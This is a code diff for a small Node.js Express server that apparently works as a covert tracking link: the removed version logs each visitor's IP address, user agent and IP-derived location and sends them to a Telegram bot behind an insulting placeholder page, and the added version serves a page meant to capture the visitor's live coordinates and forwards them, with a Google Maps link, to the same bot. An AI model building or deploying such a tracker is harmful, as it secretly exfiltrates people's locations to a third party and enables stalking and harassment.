@@ -1,5 +1,6 @@
 const express = require('express');
 const axios = require('axios');
+const path = require('path');
 const app = express();
 
 // Replace with your Telegram bot token and chat ID
@@ -16,23 +17,17 @@ const sendToTelegram = (message) => {
   }).catch(err => console.error('Error sending message:', err));
 };
 
-// Main route — triggers on link click
-app.get('/', async (req, res) => {
-  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  let userAgent = req.headers['user-agent'];
+// Serve HTML file to get live location
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
 
-  // Get IP-based location data
-  try {
-    const response = await axios.get(`http://ip-api.com/json/${ip}`);
-    const location = response.data;
-    const googleMapsLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
-
-    sendToTelegram(`New Visitor:\nIP: ${ip}\nUser Agent: ${userAgent}\nCountry: ${location.country}\nRegion: ${location.regionName}\nCity: ${location.city}\nLatitude: ${location.lat}\nLongitude: ${location.lon}\n\n<a href="${googleMapsLink}">View on Google Maps</a>`);
-  } catch (err) {
-    console.error('Error fetching location:', err);
-  }
-
-  res.send('<h1>Leon du huso</h1>');
+// Receive live location data from client
+app.get('/send-location', (req, res) => {
+  const { lat, lon } = req.query;
+  const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+  sendToTelegram(`Live Location:\nLatitude: ${lat}\nLongitude: ${lon}\n\n<a href="${googleMapsLink}">View on Google Maps</a>`);
+  res.send('Location received');
 });
 
 // Deploy to Vercel
